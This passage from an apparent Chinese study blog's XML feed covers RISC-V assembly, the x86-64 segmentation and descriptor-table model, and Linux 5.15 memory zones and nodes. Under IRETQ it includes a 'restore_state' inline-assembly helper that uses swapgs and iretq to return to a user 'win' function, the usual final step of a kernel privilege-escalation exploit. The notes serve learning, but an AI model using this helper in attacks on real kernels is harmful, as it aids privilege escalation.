1 加载到 t0 中</span><br><span class="line">    sw t0, -16(s0)             # 将 t0 存储到 b 中 (b = 1)</span><br><span class="line">    sw t0, -12(s0)             # 将 t0 存储到 i 中 (i = 1)</span><br><span class="line"></span><br><span class="line">    # 从输入中读取 n</span><br><span class="line">    la a0, input_fmt           # 将 input_fmt 的地址加载到 a0 中</span><br><span class="line">    addi a1, s0, -4            # 计算 n 的地址并存入 a1</span><br><span class="line">    call scanf                 # 调用 scanf 读取 n</span><br><span class="line"></span><br><span class="line">    # 输出前两个斐波那契数：a 和 b</span><br><span class="line">    lw t0, -20(s0)             # 将 a 加载到 t0 中</span><br><span class="line">    mv a1, t0                  # 将 t0 移动到 a1（printf 的第一个参数）</span><br><span class="line">    la a0, output_fmt          # 将 output_fmt 的地址加载到 a0 中</span><br><span class="line">    call printf                # 调用 printf 打印 a</span><br><span class="line"></span><br><span class="line">    lw t0, -16(s0)             # 将 b 加载到 t0 中</span><br><span class="line">    mv a1, t0                  # 将 t0 移动到 a1</span><br><span class="line">    la a0, output_fmt</span><br><span class="line">    call printf                # 打印 b</span><br><span class="line"></span><br><span class="line">    # 循环开始</span><br><span class="line">loop_start:</span><br><span class="line">    lw t0, -12(s0)             # 将 i 加载到 t0 中</span><br><span class="line">    lw t1, -4(s0)              # 将 n 加载到 t1 中</span><br><span class="line">    blt t0, t1, loop_body      # 如果 i &lt; n，跳转到 loop_body</span><br><span class="line">    j loop_end                 # 否则，跳转到 loop_end</span><br><span class="line"></span><br><span class="line">loop_body:</span><br><span class="line">    # t = b</span><br><span class="line">    lw t0, -16(s0)             # 将 b 加载到 t0 中</span><br><span class="line">    sw t0, -8(s0)              # 将 t0 存储到 t 中</span><br><span class="line"></span><br><span class="line">    # b = a + b</span><br><span class="line">    lw t0, -20(s0)             # 将 a 加载到 t0 中</span><br><span class="line">    lw t1, -16(s0)             # 将 b 加载到 t1 中</span><br><span class="line">    add t0, t0, t1             # t0 = a + b</span><br><span class="line">    sw t0, -16(s0)             # 将 t0 存储到 b 中 (b = a + b)</span><br><span class="line"></span><br><span class="line">    # 输出新的 b</span><br><span class="line">    mv a1, t0                  # 将新的 b 移动到 a1</span><br><span class="line">    la a0, output_fmt</span><br><span class="line">    call printf                # 打印 b</span><br><span class="line"></span><br><span class="line">    # a = t</span><br><span class="line">    lw t0, -8(s0)              # 将 t 加载到 t0 中</span><br><span class="line">    sw t0, -20(s0)             # 将 t0 存储到 a 中</span><br><span class="line"></span><br><span class="line">    # i = i + 1</span><br><span class="line">    lw t0, -12(s0)             # 将 i 加载到 t0 中</span><br><span class="line">    addi t0, t0, 1             # 增加 t0 (t0 = i + 1)</span><br><span class="line">    sw t0, -12(s0)             # 将 t0 存储回 i</span><br><span class="line"></span><br><span class="line">    j loop_start               # 跳回到循环的开始</span><br><span class="line"></span><br><span class="line">loop_end:</span><br><span class="line">    # 清理栈帧并返回（因无start会发生段错误）</span><br><span class="line">    lw ra, 28(sp)              # 恢复返回地址</span><br><span class="line">    lw s0, 24(sp)              # 恢复帧指针</span><br><span class="line">    addi sp, sp, 32            # 释放栈空间</span><br><span class="line">    ret                        # 从 main 返回</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果:</p>
<p>因为没有exit系统调用，因此会直接段错误，但是不影响程序功能。</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240917193239718.png" alt="image-20240917193239718"></p>
]]></content>
      <categories>
        <category>compiler</category>
      </categories>
      <tags>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-64存储模型</title>
    <url>/2024/08/29/%E6%9E%B6%E6%9E%84/x86-64%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><h3 id="system-register（硬件基础，寄存器是计算机硬件的一个抽象，体系结构的思想）"><a href="#system-register（硬件基础，寄存器是计算机硬件的一个抽象，体系结构的思想）" class="headerlink" title="system register（硬件基础，寄存器是计算机硬件的一个抽象，体系结构的思想）"></a>system register（硬件基础，寄存器是计算机硬件的一个抽象，体系结构的思想）</h3><blockquote>
<p>CR:用于控制系统的重要行为，例如分页分段之类</p>
<p><em>System-Flags Register</em>：一些标志位，进入内核态时需要保存</p>
<p><em>Descriptor-Table Registers</em>：指向一些描述内存的数据结构</p>
<p>Task- Reg ： 包含任务状态段的位置以及大小</p>
<p><em>Debug Registers</em>：控制软件调试</p>
<p><em>Extended-Feature-Enable Register</em>：EFER寄存器用于启用和报告非由CRn控制寄存器控制的特殊功能的状态。特别是，EFER被用于控制长模式的激活。</p>
<p><em>System-Configuration Register</em>：启用和配置系统总线功能。</p>
<p><em>System-Linkage Registers</em>：这些寄存器被系统链接指令用于指定操作系统入口点、堆栈位置和指向系统数据结构的指针。（可以看出若陷入os，其作用及其重要）</p>
<p><em>Memory-Typing Registers</em>：目前没见过用法</p>
<p><em>Debug-Extension Registers</em>：debug扩展</p>
<p><em>Performance-Monitoring Registers</em>：性能监视寄存器用于计数处理器和系统事件，或事件的持续时间。</p>
<p><em>Machine-Check Registers</em>：机器检查寄存器控制处理器对不可恢复故障的响应。它们还用于将有关此类故障的信息报告给旨在响应此类故障的系统实用程序。</p>
</blockquote>
<p><img src="/img/mypic/kernelpwn/sysregs.png" alt="sysregs"></p>
<h3 id="System-Data-Structures（软件基础）"><a href="#System-Data-Structures（软件基础）" class="headerlink" title="System-Data Structures（软件基础）"></a><strong>System-Data Structures</strong>（软件基础）</h3><blockquote>
<p>系统数据结构由系统软件创建和维护，以供处理器在受保护模式下运行时使用。在受保护模式下运行的处理器使用这些数据结构来管理内存和保护，并在中断或任务切换发生时存储程序状态信息</p>
<p>descriptors：描述符向处理器提供有关段的信息，例如它的位置、大小和特权级别。一种特殊类型的描述符，称为门，用于为软件例程提供代码选择器和入口点。可以定义任意数量的描述符，但是系统软件必须至少要为当前执行的代码段和堆栈段创建一个描述符。</p>
<p>descriptor table：全局描述符表包含对所有程序都可用的描述符，而本地描述符表包含由单个程序所使用的描述符。中断描述符表只包含由中断处理所使用的gate描述符</p>
<p>task-state segment：任务状态段是用于保存特定程序或任务的处理器状态信息的特殊段。它还包含在切换到更多特权程序时使用的堆栈指针。硬件多任务处理机制在挂起和恢复任务时使用段中的状态信息。调用和对交换堆栈的中断会导致从任务状态段读取堆栈指针。</p>
<p><em>Page-Translation Tables</em>：</p>
</blockquote>
<p><img src="/img/mypic/kernelpwn/sysdatastructor.png" alt="sysdatastructor"></p>
<h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><blockquote>
<p>这个是策略，机制是分段和分页以及地址的表示形式那些。</p>
</blockquote>
<blockquote>
<p>感觉好复杂，主要看一下保护模式下的内存模型吧,文档原话</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传统的x86架构支持一种段翻译机制，允许系统软件将指令和数据重新定位并隔离到虚拟内存空间中的任意位置。一个段是在线性地址空间内的一块连续内存。段在线性地址空间中的大小和位置是任意的。指令和数据可以分配到一个或多个内存段中，每个段都有其自身的保护特性。处理器硬件强制执行规则，规定一个段是否可以访问另一个段。</span><br><span class="line"></span><br><span class="line">分段机制提供了十个段寄存器，每个寄存器定义了一个段。这十个段寄存器中有六个（CS、DS、ES、FS、GS 和 SS）定义了用户段。用户段存储软件、数据和栈，可以被应用软件和系统软件使用。剩下的四个段寄存器（GDT、LDT、IDT 和 TR）定义了系统段。系统段包含的数据结构仅由系统软件初始化和使用。段寄存器包含一个基址，指向段的起始位置；一个限值，定义段的大小；以及定义段保护特性的属性。</span><br><span class="line"></span><br><span class="line">尽管分段在软件和数据的重新定位和保护方面提供了很大的灵活性，但通常通过结合软件和硬件分页支持来处理内存隔离和重新定位更加高效。因此，大多数现代系统软件绕过了分段功能。然而，分段不能完全禁用，理解分段机制对于实现长模式（long mode）系统软件仍然非常重要。</span><br></pre></td></tr></table></figure>

<h3 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h3><blockquote>
<p>如其名，不赘述了</p>
</blockquote>
<h3 id="Virtual-8086-Mode-Segmentation"><a href="#Virtual-8086-Mode-Segmentation" class="headerlink" title="Virtual-8086 Mode Segmentation"></a><strong>Virtual-8086 Mode Segmentation</strong></h3><blockquote>
<p>到这好像有虚拟内存了，然后利用分段，实现了更多的空间利用，但是感觉分页并不成熟</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">虚拟8086模式支持在保护模式下运行16位实模式程序（详见下文）。它使用了一种简单的内存分段方式，可选的分页机制，以及有限的保护检查。在虚拟8086模式下运行的程序最多可以访问1MB的内存空间。</span><br><span class="line"></span><br><span class="line">与实模式下的分段一样，每个64K的段（CS、DS、ES、FS、GS、SS）在16字节边界上对齐。段基址是给定段中的最低地址，等于段选择子乘以16。POP和MOV指令的工作方式与实模式完全相同，可以用来将一个（可能是新的）段选择子加载到某个段寄存器中。当发生这种情况时，选择子会更新，段基址会被设置为选择子乘以16。段限值和段属性不会改变，通常它们分别是64K（允许的最大限值）和读/写数据。</span><br><span class="line"></span><br><span class="line">除中断和异常外，远程传输（FAR transfers）的操作与实模式相同。在远程传输时，CS（代码段）选择子会更新为新值，CS段基址会设置为选择子乘以16。CS段限值和属性保持不变，但通常分别为64K和读/写属性。中断和异常会将处理器切换到保护模式。（更多信息请参见第8章“异常和中断”）。</span><br></pre></td></tr></table></figure>

<h3 id="Protected-Mode-Segmented-Memory-Models"><a href="#Protected-Mode-Segmented-Memory-Models" class="headerlink" title="Protected Mode Segmented-Memory Models"></a><strong>Protected Mode Segmented-Memory Models</strong></h3><blockquote>
<p>现在的主流，若开启部分分段，则可以向后兼容，如果全分页的话就是平坦内存模式</p>
</blockquote>
<h4 id="Multi-Segmented-Model"><a href="#Multi-Segmented-Model" class="headerlink" title="Multi-Segmented Model"></a><strong>Multi-Segmented Model</strong></h4><blockquote>
<p>分段分页结合体，可以多个段映射到一个页或一个段映射到多个页</p>
</blockquote>
<h4 id="Flat-Memory-Model"><a href="#Flat-Memory-Model" class="headerlink" title="Flat-Memory Model"></a><strong>Flat-Memory Model</strong></h4><blockquote>
<p>将段寄存器的基址置零，段限制在4GB，则可用4GB的连续的虚拟内存空间</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在64位模式下，分段机制被禁用了。分段硬件会忽略段基址值，并将其视为0。同样，段限值和大多数段属性也会被忽略。不过，有几个例外情况。CS段的DPL、D和L属性仍然会被使用，分别用于确定程序的特权级别、默认操作数大小，以及程序是在64位模式还是兼容模式下运行。FS和GS段可以在地址计算中用作额外的基址寄存器，并且这些段可以具有非零的基址值。这一特性有助于访问线程局部数据（thread-local data）和某些系统软件的数据结构。有关在64位模式下FS和GS段的详细信息，请参阅第80页的“64位模式下的FS和GS寄存器”。系统段寄存器在64位模式下始终会被使用</span><br></pre></td></tr></table></figure>

<h2 id="Segment-Selectors-and-Registers"><a href="#Segment-Selectors-and-Registers" class="headerlink" title="Segment Selectors and Registers"></a><strong>Segment Selectors and Registers</strong></h2><blockquote>
<p>此部分讲解了段寄存器中存储的内容的结构</p>
</blockquote>
<h3 id="Segment-Selectors"><a href="#Segment-Selectors" class="headerlink" title="Segment Selectors"></a>Segment Selectors</h3><blockquote>
<p>Segment selectors are pointers to specific entries in the global and local descriptor tables.</p>
</blockquote>
<p><img src="/img/mypic/kernelpwn/segmentselector.png" alt="segmentselector"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选择子索引字段（Selector Index Field）：位于位15:3。选择子索引字段指定描述符表中的一个条目。描述符表中的条目是8字节长，因此选择子索引会乘以8来形成描述符表中的字节偏移量。然后，将该偏移量加到全局或本地描述符表基址（由表索引位指示）上，以在虚拟地址空间中形成描述符条目的地址。 在长模式下，一些描述符条目是16字节长，而不是8字节（有关长模式描述符表条目的更多信息，请参阅第88页的“遗留段描述符”）。这些扩展的描述符在描述符表中占用了两个条目。然而，长模式仍然将选择子索引乘以8来形成描述符表的偏移量。系统软件负责分配选择子，以便它们正确地指向扩展条目的起始位置。</span><br><span class="line"></span><br><span class="line">表指示符（TI）位（Table Indicator (TI) Bit）：位于位2。TI位指示哪个表保存了选择子索引引用的描述符。当TI=0时，使用GDT（全局描述符表），当TI=1时，使用LDT（本地描述符表）。从适当的描述符表寄存器中读取描述符表基址，并将其加到上述的缩放选择子索引上。</span><br><span class="line"></span><br><span class="line">请求者特权级（RPL）字段（Requestor Privilege-Level (RPL) Field）：位于位1:0。RPL表示创建选择子时处理器运行的特权级别（CPL）。 RPL用于段特权检查，以防止低特权级别的软件访问特权数据。有关段特权检查的更多信息，请参阅第106页的“数据访问特权检查”和第109页的“控制传输特权检查”。</span><br><span class="line">空选择子：目前没看懂啥意思先遗留一下</span><br></pre></td></tr></table></figure>

<h3 id="Segment-Registers"><a href="#Segment-Registers" class="headerlink" title="Segment Registers"></a>Segment Registers</h3><blockquote>
<p>存储段结构的硬件基础，此处只看了64位程序的</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64位模式下的CS寄存器：在64位模式下，CS寄存器的隐藏部分大部分被忽略。只有L（长模式）、D（默认操作数大小）和DPL（描述符特权级别）属性在64位模式下被识别。地址计算假定CS.base的值为0。CS引用不会检查CS.limit值，而是检查有效地址是否为规范形式（canonical form）。</span><br><span class="line"></span><br><span class="line">64位模式下的DS、ES和SS寄存器：在64位模式下，ES、DS和SS段寄存器的内容被忽略。段寄存器隐藏部分的所有字段（基址、限值和属性）都被忽略。在64位模式下，引用ES、DS或SS段的地址计算被视为段基址为0。处理器不会执行限值检查，而是检查所有虚拟地址引用是否为规范形式。</span><br><span class="line"></span><br><span class="line">启用和激活长模式或在64位模式和兼容模式之间切换时，不会改变段寄存器的可见部分或隐藏部分的内容。除非执行显式的段加载操作，否则这些寄存器在64位模式执行期间保持不变。</span><br><span class="line"></span><br><span class="line">64位模式下的FS和GS寄存器：与CS、DS、ES和SS段不同，FS和GS段覆盖在64位模式下可以使用。当在64位模式下使用FS和GS段覆盖时，它们各自的基址会在有效地址（EA）计算中使用。完整的EA计算公式为：(FS或GS).base + base + (scale * index) + displacement。FS.base和GS.base的值也被扩展为完整的64位虚拟地址，如图4-5所示。在64位线性地址计算中的任何溢出都会被忽略，结果地址将环绕到地址空间的另一端。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>gs和fs的特殊更新方式</p>
<p>貌似段寄存器有隐藏部分，需要特殊处理</p>
<p>没看懂回来补上，貌似段寄存器有隐藏部分，因此赋值要额外小心，并且gs和fs也是64位需要用的</p>
</blockquote>
<h2 id="段描述符表"><a href="#段描述符表" class="headerlink" title="段描述符表"></a>段描述符表</h2><blockquote>
<p> 虽然64位平坦模式用户层已经基本没有了分段机制，但是0环还存在着，因此需要理解描述符表，主要分为三个，分别为GDT,LDT，IDT</p>
<p>软件通过初始化其相应的描述符-表寄存器来建立描述符表在内存中的位置。下面的部分将描述描述符表寄存器和描述符表。</p>
</blockquote>
<h3 id="GDT"><a href="#GDT" class="headerlink" title="GDT"></a>GDT</h3><blockquote>
<p>保护模式下的系统软件必须创建一个全局描述符表（GDT）。GDT包含了代码段和数据段的描述符条目（用户段），这些段可以被所有任务共享。除了用户段外，GDT还可以包含门描述符和其他系统段描述符。系统软件可以将GDT存储在内存中的任何位置，并且应该保护包含GDT的段，使其不被非特权软件访问。寻表方式如下：（如果要理解的话需要理解空选择子还要理解实模式和80386模式下的段描述符）</p>
</blockquote>
<p><img src="/img/mypic/kernelpwn/image-20240923125736202.png" alt="image-20240923125736202"></p>
<blockquote>
<p>长地址模式下的GDTR和IDTR格式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">限值（Limit）：2字节。这些位定义了GDT（全局描述符表）的16位限值或大小（以字节为单位）。限值与基址相加得到GDT的结束字节地址。如果软件尝试访问超出GDT限值的描述符，将会发生一般保护异常（#GP）。</span><br><span class="line"></span><br><span class="line">AMD64架构在长模式下不扩展描述符表的偏移量。因此，GDTR（全局描述符表寄存器）和IDTR（中断描述符表寄存器）的限值字段大小与传统大小保持不变。处理器在长模式下访问GDT和IDT时仍然会检查这些限值。</span><br><span class="line"></span><br><span class="line">基址（Base Address）：8字节。基址字段保存GDT在虚拟内存空间中的起始字节地址。GDT可以位于虚拟内存中的任何字节地址，但系统软件应将GDT对齐到四字边界（quadword boundary），以避免访问未对齐数据时可能产生的性能损失。</span><br><span class="line"></span><br><span class="line">AMD64架构将GDTR的基址字段扩展为64位，以便在长模式下运行的系统软件可以在64位虚拟地址空间中的任意位置定位GDT。当处理器在传统模式下运行时，它会忽略基址的高4字节。</span><br></pre></td></tr></table></figure>

<p><img src="/img/mypic/kernelpwn/GDTR.png" alt="GDTR"></p>
<h3 id="LDT"><a href="#LDT" class="headerlink" title="LDT"></a>LDT</h3><h3 id="GDT-1"><a href="#GDT-1" class="headerlink" title="GDT"></a>GDT</h3><h2 id="系统寄存器详解"><a href="#系统寄存器详解" class="headerlink" title="系统寄存器详解"></a>系统寄存器详解</h2><h3 id="RFLAGS"><a href="#RFLAGS" class="headerlink" title="RFLAGS"></a>RFLAGS</h3><p>包含控制位和状态位，控制位中含有权限信息，状态位则是用来保存算数运算的状态，内核态到用户态需要恢复</p>
<h2 id="部分内核级指令"><a href="#部分内核级指令" class="headerlink" title="部分内核级指令"></a>部分内核级指令</h2><h3 id="Fast-System-Call-and-Return"><a href="#Fast-System-Call-and-Return" class="headerlink" title="Fast System Call and Return"></a><strong>Fast System Call and Return</strong></h3><h4 id="SYSCALL-and-SYSRET"><a href="#SYSCALL-and-SYSRET" class="headerlink" title="SYSCALL and SYSRET"></a><strong>SYSCALL and SYSRET</strong></h4><h4 id="SYSENTER-and-SYSEXIT-Legacy-Mode-Only"><a href="#SYSENTER-and-SYSEXIT-Legacy-Mode-Only" class="headerlink" title="SYSENTER and SYSEXIT (Legacy Mode Only)"></a><strong>SYSENTER and SYSEXIT (Legacy Mode Only)</strong></h4><h4 id="SWAPGS"><a href="#SWAPGS" class="headerlink" title="SWAPGS"></a><strong>SWAPGS</strong></h4><blockquote>
<p>SWAPGS指令为系统软件提供了一种加载系统数据结构指针的快速方法。SWAPGS可以在由于系统切换指令或由于中断或异常而进入系统软件例程时使用。在返回到应用程序软件之前，SWAPGS可以恢复一个被系统数据结构指针所取代的应用程序数据结构指针。</p>
</blockquote>
<h2 id="内核指令字典"><a href="#内核指令字典" class="headerlink" title="内核指令字典"></a>内核指令字典</h2><h3 id="IRETQ"><a href="#IRETQ" class="headerlink" title="IRETQ"></a><strong>IRETQ</strong></h3><blockquote>
<p>将程序控制流从异常处理返回，并置位相关寄存器，会返回flags，cs，rip，如果cpl变化，ss和rsp也将被返回，</p>
<p>示例代码如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">restore_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;swapgs ;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %0, 0x20(%%rsp)\t\n&quot;</span> <span class="comment">//ss</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %1, 0x18(%%rsp)\t\n&quot;</span> <span class="comment">//rsp</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %2, 0x10(%%rsp)\t\n&quot;</span> <span class="comment">//flag</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %3, 0x08(%%rsp)\t\n&quot;</span> <span class="comment">//cs</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %4, 0x00(%%rsp)\t\n&quot;</span> <span class="comment">//rip</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;iretq&quot;</span></span></span><br><span class="line"><span class="params">               :</span></span><br><span class="line"><span class="params">               : <span class="string">&quot;r&quot;</span>(user_ss),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rsp),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rflags),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_cs), <span class="string">&quot;r&quot;</span>(win))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>架构</category>
        <category>x86-64</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>x86-64</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-64-task模型</title>
    <url>/2024/08/30/%E6%9E%B6%E6%9E%84/x86-64%E8%BF%9B%E7%A8%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<blockquote>
<p>本篇文章描述了本人学习架构层级的任务模型的过程，所谓操作系统就是根据底层硬件所提供的硬件资源以及数据结构来进行高效的资源管理以及状态转换，因此想学好操作系统需要学好汇编（本人粗浅理解），但是进程管理这一块os的权限比较大，可以不管硬件提供的一些机制，来进行完全由软件进行的任务切换机制，但是os本身也是一个task因此硬件至少提供一次的任务管理。</p>
</blockquote>
]]></content>
      <categories>
        <category>架构</category>
        <category>x86-64</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>x86-64</tag>
      </tags>
  </entry>
  <entry>
    <title>linux5.15之物理内存管理</title>
    <url>/2024/09/14/linux%E5%86%85%E6%A0%B8/linux5.15%E5%88%86%E6%9E%90/mm/</url>
    <content><![CDATA[<p>比赛被内核和iot爆了，感觉逻辑并不复杂，但是没有网络就是做不出来，哎，从现在开始深入学习内核了，以5.15为例（gpt推荐的），浅显研究一下内核的一些模块。先研究内存管理。比赛之前分析过2.6.10的代码，但是还是太老了，好多特性都没有，就当个开胃前菜吧。本章学习linux内核物理内存架构（对各个架构的抽象）</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>linux 5.15源代码。</p>
<p><a href="https://docs.kernel.org/mm/physical_memory.html">https://docs.kernel.org/mm/physical_memory.html</a></p>
<p><a href="https://chatgpt.com/%EF%BC%88%E7%8E%B0%E4%BB%A3%E7%A5%9E%E5%99%A8%EF%BC%89">https://chatgpt.com/（现代神器）</a></p>
<p><a href="http://www.wowotech.net/memory_management/426.html">http://www.wowotech.net/memory_management/426.html</a></p>
<p><a href="https://s3.shizhz.me/">https://s3.shizhz.me/</a></p>
<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><h2 id="关于numa，node"><a href="#关于numa，node" class="headerlink" title="关于numa，node"></a>关于numa，node</h2><blockquote>
<p>这种和架构紧密相关的模块，都定义在arch下，并在相应的include中提供相应的接口，因此理解其接口功能即可。</p>
<p>在pc端，uma更加常见，但是为了统一的实现，uma可以看成一个简化版的numa。</p>
</blockquote>
<p>内存管理中的第一个核心概念是非一致性内存访问（NUMA）。在多核和多插槽的机器中，内存可能被安排成不同的内存块（称为内存节点），访问这些内存节点的成本因与处理器的“距离”不同而有所差异。例如，每个 CPU 可能分配一个独立的内存块，或者在外围设备附近有一个适合 DMA（直接内存访问）的内存块。</p>
<p>每个内存块（bank）称为一个节点（node），在 Linux 中使用 <code>struct pglist_data</code> 来表示该概念，即使架构是 UMA（统一内存访问）。该结构总是通过其 <code>typedef pg_data_t</code> 来引用。可以使用宏 <code>NODE_DATA(nid)</code> 来引用某个节点的 <code>pg_data_t</code> 结构，其中 <code>nid</code> 是该节点的 ID。</p>
<p>对于 NUMA 架构，节点结构由架构特定的代码在启动过程中早期分配。这些结构通常会被分配到它们代表的内存块上。对于 UMA 架构，只使用一个静态的 <code>pg_data_t</code> 结构，称为 <code>contig_page_data</code>。关于节点的详细讨论会在“节点”章节中进一步说明。</p>
<h2 id="关于zone"><a href="#关于zone" class="headerlink" title="关于zone"></a>关于zone</h2><blockquote>
<p>It is important to note that many kernel operations can only take place using <code>ZONE_NORMAL</code> so it is the most performance critical zone. Zones are discussed further in Section <a href="https://docs.kernel.org/mm/physical_memory.html#zones">Zones</a>.</p>
</blockquote>
<p>整个物理地址空间被划分为一个或多个称为“zones”（区域）的块，这些区域代表内存中的某些范围。这些范围通常由访问物理内存的架构约束决定。 The memory range within a node that corresponds to a particular zone is described by a struct zone，并使用 <code>zone_t</code> 作为别名。每个 zone 都属于以下描述的类型之一。</p>
<p><strong>ZONE_DMA</strong> 和 <strong>ZONE_DMA32</strong> 历史上代表适用于 DMA（直接内存访问）的内存区域，这些区域是为那些无法访问全部地址空间的外设设备准备的。尽管近年来有了更好的接口来获取具有特定 DMA 要求的内存（如使用通用设备的动态 DMA 映射），但 <strong>ZONE_DMA</strong> 和 <strong>ZONE_DMA32</strong> 仍然表示对访问有某些限制的内存范围。根据不同的架构，这些区域类型之一或两者都可以在编译时通过 <code>CONFIG_ZONE_DMA</code> 和 <code>CONFIG_ZONE_DMA32</code> 配置选项禁用。一些 64 位平台可能需要同时启用这两个区域，因为它们支持具有不同 DMA 地址限制的外设设备。</p>
<p><strong>ZONE_NORMAL</strong>:是用于系统正常运行的内存区域，内核可以随时访问该区域中的内存。如果 DMA 设备能够访问所有可寻址的内存，则可以在此区域的页面上执行 DMA 操作。<strong>ZONE_NORMAL</strong> 始终是启用的。</p>
<p><strong>ZONE_HIGHMEM</strong>: 是物理内存的一部分，但这部分内存不会永久映射在内核的页表中。内核只能通过临时映射来访问此区域中的内存。这个区域仅在某些 32 位架构上可用，并且通过 <code>CONFIG_HIGHMEM</code> 配置选项启用。</p>
<p><strong>ZONE_MOVABLE</strong>:中的大多数页面内容是可以移动的。这意味着，尽管这些页面的虚拟地址保持不变，但它们的物理位置可以改变。<strong>ZONE_MOVABLE</strong> 常在内存热插拔时被使用，但也可以通过内核启动参数 <code>kernelcore</code>、<code>movablecore</code> 和 <code>movable_node</code> 在启动时进行配置。</p>
<p><strong>ZONE_DEVICE</strong>:代表存在于设备上的内存区域，例如持久内存（PMEM）和 GPU 内存。它与传统的 RAM 区域类型具有不同的特性，存在的目的是为设备驱动程序识别的物理地址范围提供 <code>struct page</code> 和内存映射服务。</p>
<blockquote>
<p>上述配置可以手控（通过一些配置选项），如下：</p>
</blockquote>
<p><img src="/img/mypic/linux/NODE,ZONE.png" alt="image-20240915150304069"></p>
<p><img src="/img/mypic/linux/NODEZONE2.png" alt="image-20240915150326168"></p>
<h2 id="node结构体详解"><a href="#node结构体详解" class="headerlink" title="node结构体详解"></a>node结构体详解</h2><blockquote>
<p>其中包括了回收机制，和统计机制，以及一些个function字段。一些function字段：</p>
<ol>
<li><strong>node_zones</strong>：<ul>
<li>该节点的所有内存区域（zones），包括 <code>ZONE_DMA</code>、<code>ZONE_NORMAL</code> 等。并不是每个 zone 都会被使用，但这是完整的 zone 列表。这个字段不仅在该节点的 <code>node_zonelists</code> 中引用，还可能在其他节点的 <code>node_zonelists</code> 中引用。</li>
</ul>
</li>
<li><strong>node_zonelists</strong>：<ul>
<li>包含所有节点中所有 zones 的列表。该列表定义了在内存分配时优先选择的 zone 顺序。它由内核初始化时的 <code>build_zonelists()</code> 函数设置。</li>
</ul>
</li>
<li><strong>nr_zones</strong>：<ul>
<li>当前节点中被填充（populated）的 zones 数量。</li>
</ul>
</li>
<li><strong>node_mem_map</strong>：<ul>
<li>对于使用 <code>FLATMEM</code> 内存模型的 UMA 系统，节点 0 的 <code>node_mem_map</code> 是一个 <code>struct pages</code> 数组，表示每个物理帧（page frame）。</li>
</ul>
</li>
<li><strong>node_page_ext</strong>：<ul>
<li>对于使用 <code>FLATMEM</code> 内存模型的 UMA 系统，节点 0 的 <code>node_page_ext</code> 是 <code>struct pages</code> 的扩展数组。仅在编译时启用了 <code>CONFIG_PAGE_EXTENSION</code> 时可用。</li>
</ul>
</li>
<li><strong>node_start_pfn</strong>：<ul>
<li>该节点中的第一个页面帧编号（page frame number, PFN）。</li>
</ul>
</li>
<li><strong>node_present_pages</strong>：<ul>
<li>该节点中的物理页面总数。</li>
</ul>
</li>
<li><strong>node_spanned_pages</strong>：<ul>
<li>该节点所跨越的物理页面总数，包括可能的空洞（holes）。</li>
</ul>
</li>
<li><strong>node_size_lock</strong>：<ul>
<li>用于保护定义节点范围的字段的锁。仅在启用了 <code>CONFIG_MEMORY_HOTPLUG</code> 或 <code>CONFIG_DEFERRED_STRUCT_PAGE_INIT</code> 配置选项时定义。可以使用 <code>pgdat_resize_lock()</code> 和 <code>pgdat_resize_unlock()</code> 操作 <code>node_size_lock</code>。</li>
</ul>
</li>
<li><strong>node_id</strong>：</li>
</ol>
<ul>
<li>该节点的 ID（Node ID, NID），从 0 开始编号。</li>
</ul>
<ol>
<li><strong>totalreserve_pages</strong>：</li>
</ol>
<ul>
<li>该节点为用户态分配保留的页面数。</li>
</ul>
<ol>
<li><strong>first_deferred_pfn</strong>：</li>
</ol>
<ul>
<li>如果在大型机器上延迟了内存初始化，这是需要初始化的第一个页面帧编号（PFN）。仅在启用了 <code>CONFIG_DEFERRED_STRUCT_PAGE_INIT</code> 时定义。</li>
</ul>
<ol>
<li><strong>deferred_split_queue</strong>：</li>
</ol>
<ul>
<li>按节点存储的延迟拆分的巨型页队列。仅在启用了 <code>CONFIG_TRANSPARENT_HUGEPAGE</code> 时定义。</li>
</ul>
<ol>
<li><strong>__lruvec</strong>：</li>
</ol>
<ul>
<li>每个节点的 <code>lruvec</code>，用于存储 LRU（最近最少使用）列表及相关参数。仅在禁用内存控制组（memory cgroups）时使用，不应直接访问，应该通过 <code>mem_cgroup_lruvec()</code> 来获取 <code>lruvec</code>。</li>
</ul>
</blockquote>
